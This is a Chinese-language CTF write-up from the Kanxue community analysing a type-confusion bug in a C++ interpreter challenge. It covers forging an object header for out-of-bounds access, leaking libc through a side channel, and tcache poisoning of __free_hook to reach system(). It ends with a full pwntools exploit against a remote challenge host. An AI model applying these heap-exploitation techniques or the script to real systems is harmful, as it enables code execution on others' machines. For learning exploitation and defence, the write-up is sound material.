#  伪造 Object Header：一次 C++ 解释器类型混淆漏洞利用分析  
wx_平淡无奇
                    wx_平淡无奇  看雪学苑   2026-09-18 10:01  
  
**保护**  
：Full RELRO / PIE / NX / Canary / Stripped  
## 概览  
  
题目给了一个 stripped 的 64 位 C++ PIE 二进制，跑起来是个交互式解释器，支持变量赋值、数组、算术运算和字段读写。附带 libc-2.27.so 和 ld。保护全开。  
  
  
核心思路：利用解释器内部的类型混淆，伪造对象头实现 OOB 读写，泄露 XOR 密钥和 libc 地址，通过侧信道逐位恢复 libc 基址，最后 tcache poisoning 打 __free_hook  
 拿 shell。  
  
```
伪造 BEEF 头 → OOB 读 XOR key + libc 指针    ↓侧信道逐位泄露 → 恢复 libc_base (36 bits)    ↓tcache[0x30] fd 毒化 → 指向 __free_hook - 24    ↓字符串分配落在 __free_hook → 覆写为 system    ↓字符串析构 free() → system("cat /f*;...") → flag
```  
  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM5VKBvZEyPCCxnugrnHkMMT8y0oiaCZcGiapTZ5cQW8Ubsa3bDn9f71vHb7ico33G1EDCxYU5zMA6mwI4ThxjCxMWUJvgsqYSJXJnIXfYTYYqNlQ/640?wx_fmt=svg&from=appmsg "")  
  
逆向分析  
### 解释器语法  
  
跑一下二进制，输入几条命令摸清语法。解释器读 cin.getline(buf, 0x100)  
，支持以下操作：  
  
<table><thead><tr><th style="border: 1px solid;padding: 0.2rem 1.5rem;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">语法</span></span></section></th><th style="border: 1px solid;padding: 0.2rem 1.5rem;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">含义</span></span></section></th><th style="border: 1px solid;padding: 0.2rem 1.5rem;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">示例</span></span></section></th></tr></thead><tbody><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$N=num</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">赋值立即数</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$1=48879</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$N=$M</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">寄存器拷贝</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$6=$5</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$N=[a,b,c]</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">创建数组对象</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$0=[0,0,0,0,0]</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$N op $M</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">算术运算（改左操作数）</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$1*$2</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$N=$M[i]</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">读字段 (GetField)</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$4=$0[0][4]</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$N[i]=$M</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">写字段 (SetField)</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">$0[0]=$1</span></span></code></td></tr></tbody></table>  
  
  
支持的运算符：+-*/%^|&  
，全部是无符号整数运算（乘法用 imul  
），结果写回左操作数。  
> **坑：**  
 解释器**不支持复合表达式**  
。$6=$5^$4  
 并不会计算 $5 XOR $4  
 然后赋给 $6  
，实际结果是错的。必须拆成两步：先 $6=$5  
 再 $6^$4  
。这个 bug 卡了很久。  
  
### 对象模型：NaN-boxing 与指针标签  
  
逆向 RTTI 可以还原出完整的类型体系。解释器用 64 位 tagged value 存储所有值：  
- **Number**  
直接存 64 位整数  
  
- **Object 指针**  
高 16 位为 0x1337  
 标签，低 48 位为 arena 内偏移（经 XOR 加密）  
  
- **序列化 Object 头**  
高 16 位为 0xBEEF  
 标签，低 16 位为元素数量  
  
Object 在 arena 内的布局：  
  
```
[0x00]BEEF_0000_0000_count// 序列化头，count = 元素数[0x08]element[0]// 各元素为 64-bit tagged value[0x10]element[1]...
```  
  
### XOR 指针加密  
  
程序启动时从 /dev/urandom  
 读取一个 64 位随机密钥。arena 中存储的所有值都经过 XOR 加密——写入时 val ^ key  
，读出时 stored ^ key  
 还原。  
  
  
OOB 读出来的值是加密的，需要先拿到 key 才能解密，写入时也要先加密。  
### Arena 分配器  
  
解释器用 malloc(0x10000)  
 的 64KB 堆块作为 arena，bump allocator，没有 GC。所有 Object 节点数据在 arena 里，AST 节点通过 new  
 分配在普通堆上。  
  
  
各节点的 malloc 大小（后面要用）：  
  
<table><thead><tr><th style="border: 1px solid;padding: 0.2rem 1.5rem;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">节点类型</span></span></section></th><th style="border: 1px solid;padding: 0.2rem 1.5rem;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">malloc(N)</span></span></section></th><th style="border: 1px solid;padding: 0.2rem 1.5rem;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">chunk size</span></span></section></th></tr></thead><tbody><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">Object</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">malloc(32)</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">0x30</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">BinOp</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">malloc(32)</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">0x30</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">SetField</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">malloc(48)</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">0x40</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">GetField</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">malloc(48)</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">0x40</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">AssignLit</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">malloc(24)</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">0x20</span></span></code></td></tr><tr><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><section><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">Number</span></span></section></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">malloc(16)</span></span></code></td><td style="border: 1px solid;padding: 0.2rem 1.5rem;font-size: 15px;"><code><span leaf=""><span textstyle="" style="font-size: 15px;letter-spacing: 1px;">0x20</span></span></code></td></tr></tbody></table>  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM4UYq8iaunvhQwYyTft33o5yzN6brPFT7YMg4nDqibaoAr6rkFYAgN0q87onk4X12JltVGVuD7fRKOQlHqfq8a6pAsuCr7lhQad7FyEOibQ5mH2g/640?wx_fmt=svg&from=appmsg "")  
  
漏洞分析  
### BinOp 不截断结果  
  
BinOp 的 eval()  
 做完整的 64 位整数运算，结果直接存回寄存器，不检查不截断。这就能构造任意 64 位值——特别是合法的 0xBEEF  
 头：  
  
```
$1=48879          // 0xBEEF$2=65536          // 0x10000$1*$2             // 0xBEEF_0000$1*$2             // 0xBEEF_0000_0000$1*$2             // 0xBEEF_0000_0000_0000$3=65535          // 0xFFFF (元素数)$1+$3             // 0xBEEF_0000_0000_FFFF
```  
  
### SetField 不检查 BEEF 标签  
  
SetField 写值的时候只检查目标地址是否在 arena 范围内，不检查写入的值本身。所以可以把伪造的 0xBEEF_0000_0000_FFFF  
 写入 arena 的元素位置。  
### GetField 信任伪造头 → OOB  
  
把伪造的 BEEF 头装到 $0[0]  
 后，通过 $4=$0[0][N]  
 读"第 N 个元素"。GetField 读 arena 中的 BEEF 头，解析出 count = 0xFFFF，只要 N < 0xFFFF  
 就放行。  
  
  
但实际 Object 只有 5 个元素，arena 只有 64KB。N 足够大时，读写地址越过 arena 边界，落到后面的堆元数据区域——包括 **tcache 结构体**  
和 **libc 指针**  
。  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM4N080WR8YG35xU34oZPgYCc8vVO4GW5eWCpsJPvaWOY6TA4h7ticejOrQvMvzS291NT9MLAudda7YbYKIyVMbE6lic4nCM71eEU5Shzc1TMuBQ/640?wx_fmt=svg&from=appmsg "")  
  
利用过程  
### Step 1：泄露 XOR 密钥  
  
arena 是 malloc(0x10000)  
 返回的，glibc 2.27 下实测 arena 区域初始全零。  
  
  
读取 $0[0][4]  
 对应 arena+0x30。因为该位置是 0，而 GetField 做 stored ^ key  
，读出来就是 0 ^ key = key  
。  
  
```
$4=$0[0][4]       // $4 = key
```  
  
### Step 2：泄露 libc 指针  
  
通过 LD_PRELOAD hook 扫描堆内存，找到 _IO_file_jumps  
 指针在 arena + 0x100e8  
 处。  
  
  
换算 OOB 索引：(0x100e8 - 0x10) / 8 = 8219  
。  
  
```
$5=$0[0][8219]    // 读取加密的 _IO_file_jumps 指针$6=$5             // 拷贝$6^$4             // XOR 解密 → 真实的 _IO_file_jumps 地址$8=4088480        // OFF_IO_FILE_JUMPS = 0x3e82a0$6-$8             // $6 = libc_base
```  
  
  
  
$6  
 里现在是 libc 基址——但只在寄存器里，没法直接读出来。  
### Step 3：侧信道逐位泄露 libc_base  
  
整个利用中最有意思的部分。libc_base 在寄存器里，需要"读"到 Python 脚本中。但解释器没有 print 功能。  
  
  
思路是利用 0x1337  
 标签做侧信道：当一个值的高 16 位恰好是 0x1337  
 时，解释器把它当 Object 指针处理。如果"指针"指向的不是合法对象，触发 **"runtime error!"**  
 输出——这就是 1-bit 信息泄露通道。  
  
  
构造方法：  
- 先把 libc_base 右移 12 位（低 12 位是页对齐的零），得到 36 位有效信息  
  
- 对每一位，用 %2  
 提取最低位  
  
- 把提取出的 bit（0 或 1）乘以 0x1336 << 48  
  
- 加上 1 << 48  
  
- 再加自身（×2）  
  
如果原始 bit 是 1：  
  
```
1 × 0x1336_0000_0000_0000 = 0x1336...+ 0x0001_0000_0000_0000   = 0x1337...   ← 触发 runtime error!× 2 → 溢出，但 error 已经输出了
```  
  
  
  
如果原始 bit 是 0：  
  
```
0 × 0x1336_0000_0000_0000 = 0+ 0x0001_0000_0000_0000   = 0x0001...× 2                       = 0x0002...   ← 普通数值，无报错
```  
  
  
  
检查每次操作后是否出现 "runtime error!" 就能逐位恢复 36 个有效位。每位 6 条命令，36 位共 216 条，远程大概一两分钟。  
### Step 4：tcache poisoning  
  
拿到 libc_base 后就是经典打法。通过 OOB 写修改 tcache[0x30] 的 fd 和 chunk size：  
  
```
// 预计算加密值$5 = (__free_hook - 24) ^ key     // 新的 fd$8 = 0x41 ^ key                   // 新的 chunk size// OOB 写入$0[0][8262] = $5     // 篡改 tcache[0x30] fd → __free_hook - 24$0[0][8261] = $8     // 篡改 chunk size 0x31 → 0x41
```  
  
  
  
为什么改 chunk size？需要先消耗 tcache[0x30] 的旧头部 entry。$9=[0]  
 创建 Object（malloc(32) → 0x30 chunk）弹出旧 entry，free 时按 size 0x41 放入 tcache[0x40] 而不是 0x30，避免污染毒化后的链表。  
> **关键细节：**  
 glibc 2.27 的 tcache 分配检查的是 entries[tc_idx] != NULL  
，**不是**counts > 0  
。反汇编 __libc_malloc  
（偏移 0x971a0）确认了这一点。counts 为 0 也不影响分配。  
  
> **坑：所有 BinOp 运算必须在 OOB 写之前完成。**  
 BinOp 是 malloc(32) → 0x30 chunk，毒化 tcache[0x30] 之后再执行 BinOp 会弹出毒化的 entry，破坏利用链。SetField 是 malloc(48) → 0x40 chunk，不影响。  
  
### Step 5：触发 system()  
  
tcache[0x30] 头部现在指向 __free_hook - 24  
。发送一行超过 15 字符的输入（避开 SSO），解释器主循环：  
- cin.getline(stack_buf, 0x100)  
 读入栈缓冲区  
  
- strlen  
 + _M_construct  
 构造 std::string  
  
- 长度 > 15 → malloc(len+1)  
 分配堆内存  
  
- 解析执行（"invalid syntax!" 无所谓）  
  
- 循环结束 → string 析构 → free(heap_buf)  
  
payload 结构：  
  
```
┌───────────────────────┬──────────────┐│  cat /f*;AAAAAAA...A  │  p64(system) ││      24 bytes         │   8 bytes    │└───────────────────────┴──────────────┘         ↑ offset 0            ↑ offset 24 = __free_hook
```  
  
  
  
strlen  
 遇到 p64(system_addr)  
 中的 \x00  
 停止，strlen = 30。malloc(31)  
 → 0x30 chunk → 从 tcache 弹出 __free_hook - 24  
。  
  
  
_M_construct  
 把 payload 复制过去，system_addr  
 的 6 个非零字节落在 offset 24 = __free_hook  
。  
  
  
string 析构 free(buf)  
 → __free_hook  
 → system("cat /f*;AAAA...")  
 → flag。  
> **后续命令也能执行：**__free_hook  
 设为 system  
 后，之后每轮循环的 string 析构都触发 system(input)  
。短命令用 # + padding  
 补到 16 字符以上（#  
 是 shell 注释）就行。  
  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6BZRTQuF4HJZDibFj2aRmaGejyHDCUyWofA0Db1UzfjicqXywrK8qIUwABia8ibiccv2aOSR61bHF34W515eV2njGXtzq8toteekKKQVxsRSTVf2Q/640?wx_fmt=svg&from=appmsg "")  
  
踩过的坑  
### 复合表达式解析 bug  
  
最致命的坑。$6=$5^$4  
 看起来应该是"$5 XOR $4 赋给 $6"，实测 $4=3, $5=5, $6=99  
，执行后 $6  
 变成 3 而不是 6。parser 压根不支持复合写法。  
  
  
修复：拆两步 $6=$5  
 → $6^$4  
。发现之前侧信道泄露的 libc_base 一直是错的，调了很久才定位到。  
### strlen 与 chunk size 不匹配  
  
最初 target 设为 __free_hook - 16  
，payload 是 sh; + 13 bytes + p64(system)  
。但 p64(system_addr)  
 byte 6 是 \x00  
，strlen = 22，malloc(23)  
 分配 0x20  
 chunk 而不是 0x30  
——不走毒化过的 tcache bin。  
  
改成 __free_hook - 24  
，prefix 24 字节，strlen = 30，malloc(31)  
 → 0x30  
 chunk。  
### system 地址中的坏字节  
  
system_addr = libc_base + 0x4f420  
。当 ASLR 使得 p64(system_addr)  
 前 6 字节中出现 \x00  
 或 \x0a  
 时，string 构造被截断。概率约 1/256，直接放弃重连，下次 ASLR 换个地址就好。  
##   
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7VNnYLBxiaxDgAKdlJJ6AUD6fGTZ2FJQpCWQxvOHjt5YwPgaIObicA5WbShiagNEAIfQM2NCtfKbSOZ7eTTSHXbjt1OOZZgzeUo9zAwqwG01jsw/640?wx_fmt=svg&from=appmsg "")  
  
最终 exp  
  
```
#!/usr/bin/env python3from pwn import *import syscontext.arch = 'amd64'context.log_level = 'info'OFF_IO_FILE_JUMPS = 0x3e82a0OFF_FREE_HOOK     = 0x3ed8e8OFF_SYSTEM        = 0x4f420IDX_KEY   = 4      # arena+0x30IDX_LIBC  = 8219   # arena+0x100e8   _IO_file_jumpsIDX_FD    = 8262   # arena+0x10240   tcache[0x30] fdIDX_SIZE  = 8261   # arena+0x10238   tcache[0x30] chunk sizedef cmd(p, line):    p.sendline(line.encode() if isinstance(line, str) else line)    p.recvuntil(b'> ', timeout=8)def cmd_test(p, line):    p.sendline(line.encode() if isinstance(line, str) else line)return b'runtime error!' in p.recvuntil(b'> ', timeout=8)def exploit(p):    p.recvuntil(b'> ')# 1. 伪造 BEEF 头for c in ['$0=[0,0,0,0,0]', '$1=48879', '$2=65536','$1*$2', '$1*$2', '$1*$2','$3=65535', '$1+$3', '$0[0]=$1']:        cmd(p, c)# 2. 泄露 XOR key    cmd(p, '$4=$0[0][4]')# 3. 泄露 libc 指针并计算 libc_base (寄存器内)    cmd(p, f'$5=$0[0][{IDX_LIBC}]')    cmd(p, '$6=$5');  cmd(p, '$6^$4')    cmd(p, f'$8={OFF_IO_FILE_JUMPS}');  cmd(p, '$6-$8')# 4. 构造侧信道常量for c in ['$7=4918', '$7*$2', '$7*$2', '$7*$2',   # 0x1336<<48'$1=1', '$1*$2', '$1*$2', '$1*$2',       # 1<<48'$3=2']:        cmd(p, c)    cmd(p, '$8=$6');  cmd(p, '$9=4096');  cmd(p, '$8/$9')# 5. 逐位泄露 36 bits    libc_base = 0for i in range(36):for c in ['$10=$8', '$10%$3', '$10*$7', '$10+$1']:            cmd(p, c)if cmd_test(p, '$10+$10'):            libc_base |= (1 << (i + 12))        cmd(p, '$8/$3')if (libc_base >> 40) & 0xff != 0x7f:return False    system_addr = libc_base + OFF_SYSTEM    addr_bytes = p64(system_addr)if any(addr_bytes[i] in (0x00, 0x0a) for i in range(6)):return False    # 坏字节，重试# 6. 预计算加密值 + OOB 写入    target_off = OFF_FREE_HOOK - 24for c in [f'$5={target_off}', '$5+$6', '$5^$4','$8=65', '$8^$4']:        cmd(p, c)    cmd(p, f'$0[0][{IDX_FD}]=$5')    cmd(p, f'$0[0][{IDX_SIZE}]=$8')# 7. 消耗旧 tcache entry    cmd(p, '$9=[0]')# 8. 发送 payload    payload = b'cat /f*;' + b'A' * 16 + addr_bytes    p.sendline(payload)    sleep(1)    data = p.recv(timeout=3)print(data.decode(errors='replace'))    p.interactive()return Truefor attempt in range(10):try:        p = remote('123.57.66.184', 10059)if exploit(p): break        p.close()except: pass
```  
  
## 效果  
  
```
$ python3 exp.py remote[+] Opening connection to 123.57.66.184 on port 10059: Done[+] libc_base = 0x7fa3f157f000[*] system = 0x7fa3f15ce420flag{0a906c33-809a-4c1d-8c3a-32da1fbc7b4b}
```  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K1Vpy0R7SzRvIwGFMOFced6tSy7wyL3ib2hrpqhJKx4qfDKiaadngD96Tib92QU4tEQFXllSIRAgNjrghaFbPyq5T8clrJ9agW0LM/640?wx_fmt=png&from=appmsg "")  
  
  
看雪ID：  
wx_平淡无奇  
  
https://bbs.kanxue.com/user-home-775120.htm  
  
*本文为看雪论坛优秀文章，由   
wx_平淡无奇  
   
原创，转载请注明来自看雪社区  
  
[](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619656&idx=1&sn=2f23a0dd3df2fcb4c84eeff7856fcffe&scene=21#wechat_redirect)  
  
1.25折门票限时抢购  
  
  
# 往期推荐  
  
[Windows内核免杀学习：不调 API 找 ntdll 基址](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458620444&idx=1&sn=bd763b6986b4c05a62ddf89ef70e891b&scene=21#wechat_redirect)  
  
  
[安卓ACE反作弊拉黑设备机制技术解析](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458620413&idx=2&sn=8845e3d839e35c55394911375ee298b5&scene=21#wechat_redirect)  
  
  
[一场 VM 题目的逆向与利用分析：CISCN 决赛 Pwn01 复盘](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619945&idx=2&sn=668c5a7c1d1589699676a02d69c89415&scene=21#wechat_redirect)  
  
  
[Frida 整体启动逻辑](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619811&idx=1&sn=bfee625d49ac82cbc5ddbde393844170&scene=21#wechat_redirect)  
  
  
[VT调试器原理揭秘--DebugPort转移与重建调试体系](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619748&idx=1&sn=3da8fd74ca09ea5d3b1a7e5df02207ca&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球在看**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpUHZDmkBpJ4khdIdVhiaSyOkxtAWuxJuTAs8aXISicVVUbxX09b1IWK0g/640?wx_fmt=gif&from=appmsg "")  
  
点击阅读原文查看更多  
  
